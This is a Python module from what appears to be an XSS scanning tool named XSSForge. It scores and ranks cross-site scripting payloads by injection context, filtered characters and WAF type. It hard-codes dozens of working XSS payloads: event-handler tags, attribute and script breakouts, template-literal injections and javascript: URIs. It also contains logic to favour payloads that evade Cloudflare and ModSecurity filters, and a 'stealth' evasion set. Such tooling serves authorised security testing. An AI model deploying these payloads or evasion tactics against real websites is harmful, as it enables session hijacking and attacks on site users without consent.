"""
Smart payload selector for XSSForge.

Intelligently selects and orders payloads based on context, filters, and effectiveness.
"""

from dataclasses import dataclass, field
from typing import Iterator
from xssforge.payloads.loader import PayloadLoader, get_loader
from xssforge.payloads.generator import XSSContext, FilteredChars
from xssforge.utils.encoding import Encoder


@dataclass
class PayloadScore:
    """Payload with effectiveness score."""
    payload: str
    score: float
    category: str
    auto_trigger: bool
    requires_interaction: bool = False
    browsers: list[str] = field(default_factory=lambda: ["chrome", "firefox", "safari"])


class SmartPayloadSelector:
    """
    Intelligently selects payloads based on:
    - Detected context
    - Filtered characters/strings
    - WAF presence
    - Browser compatibility
    - Auto-trigger capability (no user interaction)
    - Historical effectiveness
    """

    # Effectiveness weights
    WEIGHTS = {
        "auto_trigger": 2.0,      # No user interaction needed
        "universal_browser": 1.5,  # Works in all browsers
        "short_payload": 1.2,      # Shorter = less likely filtered
        "common_bypass": 1.3,      # Known bypass technique
        "polyglot": 1.4,           # Works in multiple contexts
    }

    # Payload effectiveness rankings (based on real-world success)
    TOP_PAYLOADS = [
        # Tier 1: Most effective auto-trigger payloads
        ("<img src=x onerror=alert(1)>", 10.0, "img", True),
        ("<svg onload=alert(1)>", 9.8, "svg", True),
        ("<svg/onload=alert(1)>", 9.7, "svg", True),
        ("<img src=x onerror=alert`1`>", 9.5, "img", True),
        ("<body onload=alert(1)>", 9.3, "body", True),
        ("<input onfocus=alert(1) autofocus>", 9.2, "input", True),
        ("<details open ontoggle=alert(1)>", 9.0, "details", True),
        ("<details/open/ontoggle=alert(1)>", 8.9, "details", True),
        ("<marquee onstart=alert(1)>", 8.5, "marquee", True),
        ("<video src=x onerror=alert(1)>", 8.4, "video", True),
        ("<audio src=x onerror=alert(1)>", 8.3, "audio", True),
        ("<video onloadstart=alert(1)><source>", 8.2, "video", True),

        # Tier 2: SVG animation events
        ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", 8.0, "svg_animate", True),
        ("<svg><set onbegin=alert(1) attributeName=x to=y>", 7.9, "svg_set", True),

        # Tier 3: Body/document events
        ("<body onpageshow=alert(1)>", 7.5, "body", True),
        ("<body onhashchange=alert(1)>", 7.4, "body", True),

        # Tier 4: Script tags (often filtered but should try)
        ("<script>alert(1)</script>", 7.0, "script", True),
        ("<script>alert`1`</script>", 6.9, "script", True),

        # Tier 5: Attribute breakouts
        ("\"><img src=x onerror=alert(1)>", 8.5, "breakout", True),
        ("'><img src=x onerror=alert(1)>", 8.4, "breakout", True),
        ("\" onmouseover=alert(1) x=\"", 6.0, "event_injection", False),
        ("' onmouseover=alert(1) x='", 5.9, "event_injection", False),

        # Tier 6: JavaScript context
        ("</script><script>alert(1)</script>", 7.5, "js_breakout", True),
        ("\";alert(1)//", 6.5, "js_string", True),
        ("';alert(1)//", 6.4, "js_string", True),

        # Tier 7: Protocol handlers
        ("javascript:alert(1)", 5.5, "protocol", False),
        ("javascript:alert`1`", 5.4, "protocol", False),

        # Tier 8: CSS-based (animation triggers)
        ("<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>", 6.0, "css_animation", True),

        # Tier 9: Newer events
        ("<xss onfocus=alert(1) autofocus tabindex=1>", 7.0, "custom_tag", True),
        ("<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>", 6.5, "custom_tag", True),
    ]

    def __init__(self):
        self.loader = get_loader()
        self.encoder = Encoder()

    def select_payloads(
        self,
        context: XSSContext,
        filters: FilteredChars | None = None,
        waf: str | None = None,
        max_payloads: int = 50,
        auto_trigger_only: bool = False,
        include_all_cheatsheet: bool = False,
    ) -> list[str]:
        """
        Select optimal payloads for the given context.

        Args:
            context: Detected injection context
            filters: Known filtered characters/strings
            waf: Detected WAF type
            max_payloads: Maximum payloads to return
            auto_trigger_only: Only return auto-triggering payloads
            include_all_cheatsheet: Include ALL PortSwigger payloads
        """
        filters = filters or FilteredChars()
        scored_payloads: list[PayloadScore] = []

        # Get base payloads based on context
        if include_all_cheatsheet:
            base_payloads = self._get_all_cheatsheet_payloads()
        else:
            base_payloads = self._get_context_payloads(context)

        # Score each payload
        for payload, base_score, category, auto_trigger in base_payloads:
            if auto_trigger_only and not auto_trigger:
                continue

            score = self._calculate_score(
                payload, base_score, context, filters, waf, auto_trigger
            )

            if score > 0:
                scored_payloads.append(PayloadScore(
                    payload=payload,
                    score=score,
                    category=category,
                    auto_trigger=auto_trigger,
                    requires_interaction=not auto_trigger,
                ))

        # Sort by score (highest first)
        scored_payloads.sort(key=lambda x: x.score, reverse=True)

        # Return top payloads
        return [p.payload for p in scored_payloads[:max_payloads]]

    def _get_all_cheatsheet_payloads(self) -> list[tuple[str, float, str, bool]]:
        """Get ALL payloads from the PortSwigger cheatsheet."""
        all_payloads = list(self.TOP_PAYLOADS)

        # Add all tag payloads from loader
        for tag_payload in self.loader.get_all_tag_payloads():
            payload = tag_payload.payload
            # Avoid duplicates
            if not any(p[0] == payload for p in all_payloads):
                all_payloads.append((
                    payload,
                    7.0 if tag_payload.auto_trigger else 4.0,
                    tag_payload.tag,
                    tag_payload.auto_trigger,
                ))

        # Add all event-based payloads
        for event in self.loader.get_all_events():
            if event.example and event.example not in [p[0] for p in all_payloads]:
                is_auto = event.name in self.loader.get_auto_trigger_events()
                all_payloads.append((
                    event.example,
                    6.5 if is_auto else 3.5,
                    event.category,
                    is_auto,
                ))

        # Add polyglots
        for polyglot in self.loader.get_polyglots():
            if polyglot not in [p[0] for p in all_payloads]:
                all_payloads.append((polyglot, 7.0, "polyglot", True))

        return all_payloads

    def _get_context_payloads(self, context: XSSContext) -> list[tuple[str, float, str, bool]]:
        """Get payloads optimized for specific context."""
        payloads = list(self.TOP_PAYLOADS)

        # Add context-specific payloads
        if context == XSSContext.HTML_BODY:
            # All TOP_PAYLOADS are good for HTML body
            pass

        elif context in (XSSContext.HTML_ATTRIBUTE_QUOTED, XSSContext.HTML_ATTRIBUTE_SINGLE):
            quote = '"' if context == XSSContext.HTML_ATTRIBUTE_QUOTED else "'"
            # Prioritize attribute breakouts
            payloads.extend([
                (f"{quote}><img src=x onerror=alert(1)>", 9.5, "attr_breakout", True),
                (f"{quote}><svg onload=alert(1)>", 9.4, "attr_breakout", True),
                (f"{quote} onfocus=alert(1) autofocus x={quote}", 8.0, "event_inject", True),
                (f"{quote} onmouseover=alert(1) x={quote}", 6.0, "event_inject", False),
            ])

        elif context == XSSContext.HTML_ATTRIBUTE_UNQUOTED:
            payloads.extend([
                (" onfocus=alert(1) autofocus ", 8.5, "event_inject", True),
                (" onmouseover=alert(1) ", 6.0, "event_inject", False),
                ("><img src=x onerror=alert(1)>", 9.0, "tag_inject", True),
            ])

        elif context in (XSSContext.JAVASCRIPT_STRING, XSSContext.JAVASCRIPT_STRING_SINGLE):
            quote = '"' if context == XSSContext.JAVASCRIPT_STRING else "'"
            payloads.extend([
                (f"{quote};alert(1)//", 9.0, "js_breakout", True),
                (f"{quote}+alert(1)+{quote}", 8.5, "js_concat", True),
                ("</script><script>alert(1)</script>", 9.5, "script_breakout", True),
                ("</script><img src=x onerror=alert(1)>", 9.3, "script_breakout", True),
            ])

        elif context == XSSContext.JAVASCRIPT_TEMPLATE:
            payloads.extend([
                ("${alert(1)}", 9.5, "template", True),
                ("${alert`1`}", 9.4, "template", True),
                ("`+alert(1)+`", 8.0, "template_concat", True),
            ])

        elif context in (XSSContext.URL_HREF, XSSContext.URL_SRC):
            payloads.extend([
                ("javascript:alert(1)", 8.0, "protocol", False),
                ("javascript:alert`1`", 7.9, "protocol", False),
                ("data:text/html,<script>alert(1)</script>", 7.5, "data_uri", True),
            ])

        elif context == XSSContext.HTML_COMMENT:
            payloads.extend([
                ("--><img src=x onerror=alert(1)>", 9.5, "comment_break", True),
                ("--><svg onload=alert(1)>", 9.4, "comment_break", True),
                ("--!><img src=x onerror=alert(1)>", 9.3, "comment_break", True),
            ])

        return payloads

    def _calculate_score(
        self,
        payload: str,
        base_score: float,
        context: XSSContext,
        filters: FilteredChars,
        waf: str | None,
        auto_trigger: bool,
    ) -> float:
        """Calculate effectiveness score for a payload."""
        score = base_score

        # Check if payload is blocked by filters
        if filters.is_blocked(payload):
            return 0.0  # Completely blocked

        # Boost for auto-trigger
        if auto_trigger:
            score *= self.WEIGHTS["auto_trigger"]

        # Boost for shorter payloads (less likely to be filtered)
        if len(payload) < 30:
            score *= self.WEIGHTS["short_payload"]

        # Boost for template literal (often bypasses filters)
        if "alert`" in payload:
            score *= 1.2

        # Boost for no-space payloads
        if "/onload=" in payload or "/onerror=" in payload:
            score *= 1.15

        # Context-specific adjustments
        if context == XSSContext.HTML_BODY:
            if "<script" in payload.lower():
                score *= 0.8  # Often filtered
            if "onerror" in payload.lower() or "onload" in payload.lower():
                score *= 1.2  # Usually works

        # WAF-specific adjustments
        if waf:
            if waf.lower() == "cloudflare":
                if "<script>" in payload:
                    score *= 0.5  # Cloudflare blocks script tags
                if "alert`" in payload:
                    score *= 1.3  # Template literals often bypass
            elif waf.lower() in ("modsecurity", "mod_security"):
                if "alert(" in payload and "onerror" in payload:
                    score *= 0.7  # Common pattern blocked

        return score

    def get_comprehensive_payloads(self) -> list[str]:
        """Get ALL payloads from the cheatsheet for thorough testing."""
        all_payloads = self._get_all_cheatsheet_payloads()
        return [p[0] for p in all_payloads]

    def get_quick_payloads(self) -> list[str]:
        """Get top 10 most effective payloads for quick testing."""
        return [p[0] for p in self.TOP_PAYLOADS[:10]]

    def get_stealth_payloads(self) -> list[str]:
        """Get payloads designed to evade filters."""
        return [
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "<details/open/ontoggle=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<xss onfocus=alert(1) autofocus tabindex=1>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        ]
